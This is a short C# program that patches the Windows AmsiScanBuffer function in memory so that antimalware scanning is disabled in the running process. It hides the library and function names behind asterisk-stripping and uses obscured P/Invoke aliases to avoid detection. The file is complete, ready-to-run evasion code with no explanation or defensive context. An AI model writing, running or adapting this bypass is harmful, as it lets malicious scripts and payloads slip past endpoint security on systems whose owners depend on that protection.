using System;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace PHANTOM
{
    internal class Program
    {
        [DllImport(@"kernel32", EntryPoint = "GetProcAddress")]
        private static extern IntPtr a(IntPtr hModule, string procName);

        [DllImport(@"kernel32", EntryPoint = "LoadLibrary")]
        private static extern IntPtr b(string name);

        [DllImport(@"kernel32", EntryPoint = "VirtualProtect")]
        private static extern bool c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static IntPtr d = Program.b("*a*m*s*i*.*d*l*l*".Replace("*", ""));

        private static string e = "*A*m*s*i*S*c*a*n*B*u*f*f*e*r*".Replace("*", "");

        private static void copy(byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, Patch.Length);
        }

        static void Main()
        {
            IntPtr intPtr = Program.a(Program.d, Program.e);
            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint num;
            Program.c(intPtr, (UIntPtr)Patch.Length, 0x40, out num);
            Program.copy(Patch, intPtr);
        }
    }
}